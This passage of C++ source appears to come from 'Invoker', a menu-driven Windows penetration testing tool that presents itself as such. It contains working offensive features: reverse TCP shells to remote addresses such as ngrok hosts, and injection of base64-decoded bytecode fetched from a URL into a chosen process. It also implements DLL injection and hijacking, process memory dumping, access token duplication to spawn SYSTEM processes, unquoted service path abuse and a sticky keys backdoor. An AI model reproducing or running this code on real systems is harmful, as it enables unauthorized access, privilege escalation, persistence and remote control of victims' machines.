	Output("# [3] HKEY_LOCAL_MACHINE                                                   #");
	Output("# [4] HKEY_USERS                                                           #");
	Output("# [5] HKEY_CURRENT_CONFIG                                                  #");
	Output("############################################################################");
	std::string choice = Input("Choose registry hive");
	Output("");
	HKEY hKey = NULL;
	if (choice == "1") {
		hKey = HKEY_CLASSES_ROOT;
	}
	else if (choice == "2") {
		hKey = HKEY_CURRENT_USER;
	}
	else if (choice == "3") {
		hKey = HKEY_LOCAL_MACHINE;
	}
	else if (choice == "4") {
		hKey = HKEY_USERS;
	}
	else if (choice == "5") {
		hKey = HKEY_CURRENT_CONFIG;
	}
	else {
		Output("Invalid choice");
	}
	if (hKey != NULL) {
		std::string subkey = Input("Enter subkey");
		Output("");
		std::string name = Input("Enter value name");
		Output("");
		std::string data = Input("Enter value data");
		Output("");
		std::string confirm = Input("Confirm (yes)");
		if (StrToLower(confirm) == "yes") {
			Output("");
			EditRegistryKey(&hKey, subkey, name, data);
		}
	}
}

void CPP_ScheduleTask() {
	Output("################################# EXAMPLES #################################");
	Output("# Name : CMD                                                               #");
	Output("# User : Kira                                                              #");
	Output("# File : C:\\Windows\\System32\\cmd.exe                                       #");
	Output("# Args : /K WHOAMI /PRIV                                                   #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Name : PowerShell                                                        #");
	Output("# User : NT AUTHORITY\\SYSTEM                                               #");
	Output("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe         #");
	Output("################################### NOTE ###################################");
	Output("# Task will trigger only once, after exactly one minute.                   #");
	Output("############################################################################");
	Output("");
	std::string name = Input("Enter task name");
	Output("");
	std::string user = Input("Enter user name");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	std::string args = Input("Enter file arguments (optional)");
	Output("");
	if (name.length() < 1 || user.length() < 1 || file.length() < 1) {
		Output("Required parameters are missing");
	}
	else {
		ScheduleTask(name, user, file, args);
	}
}

// ------------------------------------ WMI ------------------------------------

std::string WMI_SetNamespace(std::string space) {
	Output("################################# EXAMPLES #################################");
	Output("# Namespace : ROOT\\CIMV2                                                   #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Namespace : ROOT\\SUBSCRIPTION                                            #");
	Output("############################################################################");
	Output("");
	std::string tmp = Input("Enter namespace");
	if (tmp.length() < 1) {
		Output("");
		Output("Namespace is required");
	}
	else {
		space = tmp;
	}
	return space;
}

void WMI_RunQuery(std::string space) {
	Output("################################### INFO ###################################");
	printf("# Namespace : %-*.*s #\n", 61, 61, space.c_str());
	Output("# Language  : WQL                                                          #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Enter \"back\" to return to the WMI menu.                                  #");
	Output("# Enter \"clear\" or \"cls\" to clear the window.                              #");
	Output("############################################################################");
	Output("");
	Output("################################# EXAMPLES #################################");
	Output("# Query : SELECT * FROM Win32_Process                                      #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Query : SELECT * FROM Win32_Service                                      #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Query : SELECT * FROM Win32_Account                                      #");
	Output("################################# NOTE #####################################");
	Output("# Sometimes retrieving specific properties can get bugged.                 #");
	Output("############################################################################");
	Output("");
	std::string query = "back";
	do {
		query = Input("Enter query");
		if (query.length() < 1) {
			Output("");
			Output("Query is required");
			Output("");
		}
		else if (StrToLower(query) == "clear" || StrToLower(query) == "cls") {
			Clear();
		}
		else if (StrToLower(query) != "back") {
			Output("");
			WMIRunQuery(query, "WQL", space);
			Output("");
		}
	} while (StrToLower(query) != "back");
}

void WMI_ExecuteMethod(std::string space) {
	Output("################################# EXAMPLES #################################");
	Output("# Class    : Win32_Process                                                 #");
	Output("# Method   : Create                                                        #");
	Output("# Property : CommandLine                                                   #");
	Output("# Value    : C:\\Windows\\System32\\cmd.exe /K \"WHOAMI /PRIV\"                 #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Class    : Win32_Process.Handle=\"3301\"                                   #");
	Output("# Method   : Terminate                                                     #");
	Output("# Property : Reason                                                        #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Class    : Win32_Service.Name=\"EventLog\"                                 #");
	Output("# Method   : StopService | StartService                                    #");
	Output("############################################################################");
	Output("");
	std::string obj = Input("Enter WMI class");
	Output("");
	std::string method = Input("Enter WMI class method");
	Output("");
	std::string property = Input("Enter WMI class property (optional)");
	Output("");
	std::string value = Input("Enter WMI class property value (optional)");
	Output("");
	if (obj.length() > 0 && method.length() > 0 && property.length() > 0) {
		WMIExecuteMethod(obj, method, property, value, space);
	}
	else if (obj.length() > 0 && method.length() > 0) {
		WMIExecuteMethod(obj, method, space);
	}
	else {
		Output("Required parameters are missing");
	}
}

void CPP_WMI() {
	std::string space = "ROOT\\CIMV2";
	std::string choice = "0";
	do {
		Output("#################### WINDOWS MANAGEMENT INSTRUMENTATION ####################");
		Output("# [0] Exit                                                                 #");
		Output("#--------------------------------------------------------------------------#");
		Output("# [1] Set namespace                                                        #");
		Output("#--------------------------------------------------------------------------#");
		Output("# [2] Run query                                                            #");
		Output("# [3] Execute method                                                       #");
		Output("############################################################################");
		printf("# Namespace: %-*.*s #\n", 61, 61, space.c_str());
		Output("################################### NOTE ###################################");
		Output("# More features are in development.                                        #");
		Output("############################################################################");
		choice = Input("Your choice");
		if (choice != "0") {
			Clear();
		}
		if (IsPositiveNumber(choice)) {
			int num = atoi(choice.c_str());
			if (num >= 1 && num <= 3) {
				switch (num) {
				case  1: { space = WMI_SetNamespace(space); break; }
				case  2: { WMI_RunQuery(space);             break; }
				case  3: { WMI_ExecuteMethod(space);        break; }
				}
				Pause();
				Clear();
			}
		}
	} while (choice != "0");
}

// --------------------------------- PROCESSES ---------------------------------

void CPP_ReverseTCP() {
	Output("################################# EXAMPLES #################################");
	Output("# Address : 192.168.8.5                                                    #");
	Output("# Port    : 9000                                                           #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Address : 2.tcp.ngrok.io                                                 #");
	Output("# Port    : 11650                                                          #");
	Output("############################################################################");
	Output("");
	std::string addr = Input("Enter address");
	Output("");
	std::string port = Input("Enter port number");
	Output("");
	if (addr.length() < 1 || port.length() < 1) {
		Output("Both parameters are required");
	}
	else if (!IsPositiveNumber(port)) {
		Output("Port number must be a positive number");
	}
	else {
		std::string name = GetFileName();
		ReverseTCP(addr, port.c_str(), name.length() > 0 ? name : "CMD");
	}
}

void CPP_TerminateProcess() {
	int pid = GetProcessID();
	if (pid != -1) {
		Output("");
		TerminateProcess(pid);
	}
}

void CPP_RunProcess() {
	Output("################################# EXAMPLES #################################");
	Output("# File : C:\\Windows\\System32\\cmd.exe                                       #");
	Output("# Args : /K WHOAMI /PRIV                                                   #");
	Output("#--------------------------------------------------------------------------#");
	Output("# File : C:\\Windows\\SysWOW64\\cmd.exe                                       #");
	Output("#--------------------------------------------------------------------------#");
	Output("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe         #");
	Output("################################### NOTE ###################################");
	Output("# Process will run in a new window.                                        #");
	Output("############################################################################");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	std::string args = Input("Enter file arguments (optional)");
	Output("");
	if (file.length() < 1) {
		Output("File name is rquired");
	}
	else {
		RunProcess(file, args);
	}
}

void CPP_DumpProcessMemory() {
	int pid = GetProcessID();
	if (pid != -1) {
		Output("");
		DumpProcessMemory(pid);
	}
}

// --------------------------------- BYTECODES ---------------------------------

void CPP_InjectBytcodeWeb() {
	Output("################################# EXAMPLES #################################");
	Output("# URL     : 08ab992ff989.ngrok.io/payload.txt                              #");
	Output("# Port    : 80                                                             #");
	Output("# Element : <invoker>payload</invoker>                                     #");
	Output("################################### NOTE ###################################");
	Output("# By default, HTTP GET request will be sent.                               #");
	Output("# This method does not yet support HTTPS.                                  #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Custom element must be unique within the web content.                    #");
	Output("# Payload must be enclosed from both front and back.                       #");
	Output("############################################################################");
	Output("");
	std::string url = Input("Enter URL");
	Output("");
	std::string port = Input("Enter port number");
	Output("");
	std::string element = Input("Enter custom element");
	Output("");
	if (url.length() < 1 || port.length() < 1 || element.length() < 1) {
		Output("All parameters are required");
	}
	else if (!IsPositiveNumber(port)) {
		Output("Port number must be a positive number");
	}
	else {
		std::string data = GetWebContent(url, port.c_str());
		if (data.length() > 0) {
			std::string payload = ExtractPayload(data, element);
			if (payload.length() > 0) {
				Output("");
				int pid = GetProcessID();
				if (pid != -1) {
					Output("");
					// NOTE: Change or omit the payload decoder here.
					payload = base64_decode(payload);
					InjectBytecode(pid, payload);
				}
			}
		}
	}
}

void CPP_InjectBytcodeFile() {
	Output("################################# EXAMPLES #################################");
	Output("# File : C:\\Users\\Kira\\Downloads\\payload.bin                               #");
	Output("################################### NOTE ###################################");
	Output("# Bytecode will run in a new thread.                                       #");
	Output("############################################################################");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	if (file.length() < 1) {
		Output("File name is required");
	}
	else {
		std::string payload = ReadFile(file);
		if (payload.length() > 0) {
			int pid = GetProcessID();
			if (pid != -1) {
				Output("");
				InjectBytecode(pid, payload);
			}
		}
	}
}

// ------------------------------------ DLL ------------------------------------

void CPP_InjectDLL() {
	Output("################################# EXAMPLES #################################");
	Output("# File : C:\\Users\\Kira\\Downloads\\payload.dll                               #");
	Output("################################# NOTE #####################################");
	Output("# DLL will run in a new thread.                                            #");
	Output("############################################################################");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	if (file.length() < 1) {
		Output("File name is required");
	}
	else {
		int pid = GetProcessID();
		if (pid != -1) {
			Output("");
			InjectDLL(pid, file);
		}
	}
}

void CPP_DLLHijacking() {
	int pid = GetProcessID();
	if (pid != -1) {
		Output("");
		ListProcessDLLs(pid);
		Output("");
		Output("################################# NOTE #####################################");
		Output("# This method will only list loaded DLLs.                                  #");
		Output("#--------------------------------------------------------------------------#");
		Output("# Rename your \"payload.dll\" to any of the listed DLLs and replace it.      #");
		Output("# Some directories may require a write permission.                         #");
		Output("# Restart the process if needed.                                           #");
		Output("# Some processes may crash or not work correctly afterwards.               #");
		Output("############################################################################");
	}
}

// NOTE: Structure is defined in ".\lib\invoker.h".
hook info = { "", NULL, false };

void CPP_InstallWindowsHook() {
	if (!info.active) {
		Output("################################# EXAMPLES #################################");
		Output("# File : C:\\Users\\Kira\\Downloads\\InvokerHook_x64.dll                       #");
		Output("################################# NOTE #####################################");
		Output("# Only one hook can be active at the time.                                 #");
		Output("############################################################################");
		std::string file = Input("Enter file name");
		Output("");
		if (file.length() < 1) {
			Output("File name is rquired");
		}
		else {
			info.file = file;
			info.hThread = CreateHookThread(&info);
		}
	}
	else {
		std::string confirm = Input("Uninstall hook procedure (yes)");
		if (StrToLower(confirm) == "yes") {
			RemoveHookThread(&info);
		}
	}
}

// ----------------------------------- TOKEN -----------------------------------

void CPP_EnableAccessTokenPrivs() {
	EnableAccessTokenPrivs();
}

void CPP_DuplicateAccessToken() {
	Output("################################# EXAMPLES #################################");
	Output("# File : C:\\Windows\\System32\\cmd.exe                                       #");
	Output("# Args : /K WHOAMI /PRIV                                                   #");
	Output("# PID  : 1337                                                              #");
	Output("#--------------------------------------------------------------------------#");
	Output("# File : C:\\Users\\Kira\\Downloads\\Invoker_x64.exe                           #");
	Output("# PID  : 3301                                                              #");
	Output("################################# NOTE #####################################");
	Output("# Process will run in a new window.                                        #");
	Output("############################################################################");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	std::string args = Input("Enter file arguments (optional)");
	Output("");
	if (file.length() < 1) {
		Output("File name is rquired");
	}
	else {
		int pid = GetProcessID();
		if (pid != -1) {
			Output("");
			HANDLE hToken = DuplicateAccessToken(pid);
			if (hToken != NULL) {
				Output("");
				RunProcess(file, args, &hToken);
				CloseHandle(hToken);
			}
		}
	}
}
// ----------------------------------- MISCS -----------------------------------

void CPP_UnquotedServicePaths() {
	std::string name = GetUnquotedServiceName();
	if (name.length() > 0) {
		Output("");
		Output("############################################################################");
		Output("# [1] Start                                                                #");
		Output("# [2] Stop                                                                 #");
		Output("# [3] Restart                                                              #");
		Output("############################################################################");
		std::string choice = Input("Your choice");
		Output("");
		if (choice == "1") {
			ManageService(name, SVC_START);
		}
		else if (choice == "2") {
			ManageService(name, SVC_STOP);
		}
		else if (choice == "3") {
			ManageService(name, SVC_RESTART);
		}
		else {
			Output("Invalid choice");
		}
	}
}

void CPP_ReplaceStickyKeys() {
	if (ReplaceStickyKeys() != 0) {
		Output("");
		Output("################################# NOTE #####################################");
		Output("# To restore the backup, rename \"sethc_backup.exe\" back to \"sethc.exe\".    #");
		Output("############################################################################");
	}
}

// -----------------------------------------------------------------------------

int main(int argc, char** argv) {
	SetConsoleTitle(L"Invoker");
	if (argc == 3) {
		std::string name = GetFileName();
		ReverseTCP(argv[1], argv[2], name.length() > 0 ? name : "CMD");
	}
	else {
		std::string choice = "0";
		do {
			Output("############################################################################");
			Output("#                                                                          #");
			Output("#                             Invoker v3.4.7                               #");
			Output("#                                     by Ivan Sincek                       #");
			Output("#                                                                          #");
			Output("# Penetration testing utility.                                             #");
			Output("# GitHub repository at github.com/ivan-sincek/invoker.                     #");
			Output("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.       #");
			Output("#                                                                          #");
			Output("############################################################################");
			Output("# [ 0]            Exit                                                     #");
			Output("############################################################################");
			Output("# [ 1] [SYSTEM]   Invoke CMD                                               #");
			Output("# [ 2] [SYSTEM]   Invoke PS                                                #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [ 3] [MS WORD]  Invoke CMD & PS                                          #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [ 4] [PS]       Reverse TCP                                              #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [ 5] [C++]      Download File                                            #");
			Output("# [ 6] [C++]      Add/Edit Registry Key                                    #");
			Output("# [ 7] [C++]      Schedule Task                                            #");
			Output("# [ 8] [C++]      Windows Management Instrumentation (WMI)                 #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [ 9] [C++]      Reverse TCP                                              #");
			Output("# [10] [C++]      Terminate Process                                        #");
			Output("# [11] [C++]      Run Process                                              #");
			Output("# [12] [C++]      Dump Process Memory                                      #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [13] [C++]      Inject Bytecode From Web                                 #");
			Output("# [14] [C++]      Inject Bytecode From File                                #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [15] [C++]      Inject DLL                                               #");
			Output("# [16] [C++]      DLL Hijacking                                            #");
			Output("# [17] [C++]      Install Windows Hook From DLL                            #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [18] [C++]      Enable Access Token Privileges                           #");
			Output("# [19] [C++]      Duplicate Access Token                                   #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [20] [C++]      Unquoted Service Paths                                   #");
			Output("# [21] [C++]      Replace Sticky Keys                                      #");
			Output("############################################################################");
			choice = Input("Your choice");
			if (choice != "0") {
				Clear();
			}
			if (IsPositiveNumber(choice)) {
				int num = atoi(choice.c_str());
				if (num >= 1 && num <= 21) {
					switch (num) {
					case  1: { SYSTEM_InvokeShell();         break; }
					case  2: { SYSTEM_InvokePowerShell();    break; }
					case  3: { MS_InvokeShells();            break; }
					case  4: { PS_ReverseTCP();              break; }
					case  5: { CPP_DownloadFile();           break; }
					case  6: { CPP_EditRegistryKey();        break; }
					case  7: { CPP_ScheduleTask();           break; }
					case  8: { CPP_WMI();                    break; }
					case  9: { CPP_ReverseTCP();             break; }
					case 10: { CPP_TerminateProcess();       break; }
					case 11: { CPP_RunProcess();             break; }
					case 12: { CPP_DumpProcessMemory();      break; }
					case 13: { CPP_InjectBytcodeWeb();       break; }
					case 14: { CPP_InjectBytcodeFile();      break; }
					case 15: { CPP_InjectDLL();              break; }
					case 16: { CPP_DLLHijacking();           break; }
					case 17: { CPP_InstallWindowsHook();     break; }
					case 18: { CPP_EnableAccessTokenPrivs(); break; }
					case 19: { CPP_DuplicateAccessToken();   break; }
					case 20: { CPP_UnquotedServicePaths();   break; }
					case 21: { CPP_ReplaceStickyKeys();      break; }
					}
					Pause();
					Clear();
				}
			}
		} while (choice != "0");
	}
	return 0;
}

